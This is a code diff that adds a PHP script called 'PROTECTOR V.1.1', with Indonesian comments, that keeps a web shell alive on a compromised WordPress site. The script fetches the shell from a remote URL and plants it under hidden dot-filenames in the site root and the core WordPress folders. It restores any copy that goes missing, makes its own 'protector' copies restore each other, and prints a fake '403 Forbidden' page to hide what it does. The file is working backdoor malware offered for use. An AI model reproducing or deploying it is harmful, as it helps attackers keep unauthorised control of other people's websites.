@@ -1,0 +1,85 @@
+<?php
+// =============================================
+// PROTECTOR V.1.1
+// =============================================
+
+$shell_url = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/aw.txt';
+
+$spread_locations = [
+    '', '/wp-includes/', '/wp-admin/', '/wp-content/plugins/'
+];
+
+$shell_filenames = ['.user.php', '.version.php', '.cache.php', '.updatedoc.php'];
+
+$protectors = ['.syscache.php', '.update.php', '.controller.php', '.configcache.php'];
+
+$log_file = $_SERVER['DOCUMENT_ROOT'] . '/.update-log.txt';
+
+function write_log($msg) {
+    global $log_file;
+    @file_put_contents($log_file, "[" . date('Y-m-d H:i:s') . "] $msg\n", FILE_APPEND);
+}
+
+function download_shell($url) {
+    // ... (sama seperti sebelumnya, gue skip biar pendek)
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 40);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $data = curl_exec($ch);
+        curl_close($ch);
+        if (strlen($data) > 50000) return $data;
+    }
+    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
+}
+
+$docroot = $_SERVER['DOCUMENT_ROOT'];
+
+// ==================== DONT CHANGE IT  ====================
+//             PROTECTOR WEBSITE NEW VERSION 
+// =======================================================
+$restored_count = 0;
+foreach ($spread_locations as $folder) {
+    $full_folder = rtrim($docroot . $folder, '/') . '/';
+    if (!is_dir($full_folder)) @mkdir($full_folder, 0755, true);
+
+    foreach ($shell_filenames as $name) {
+        $full_path = $full_folder . $name;
+
+        // Cek setiap kali protector dijalankan
+        if (!file_exists($full_path) || filesize($full_path) < 50000) {
+            $code = download_shell($shell_url);
+            if ($code) {
+                file_put_contents($full_path, $code);
+                @chmod($full_path, 0644);
+                write_log("Shell restored to: $folder$name");
+                $restored_count++;
+            }
+        }
+    }
+}
+
+echo "<pre> 403 Forbidden You don't have permission to access this resource. $restored_count shell</pre>";
+
+// Saling restore protector (tetap)
+foreach ($protectors as $p) {
+    $path = $docroot . '/' . $p;
+    if (!file_exists($path)) {
+        foreach ($protectors as $source) {
+            if (file_exists($docroot . '/' . $source)) {
+                copy($docroot . '/' . $source, $path);
+                write_log("Protector restored: $p");
+                break;
+            }
+        }
+    }
+}
+
+// Anti-malware (skip shell) - tetap sama seperti sebelumnya
+// ... (bagian kill_malware sama seperti kode terakhir)
+
+$malware_killed = 0; // isi dengan function kill_malware kalau masih mau pakai
+
+write_log("Protector run - Restored: $restored_count | Malware killed: $malware_killed");
+?>
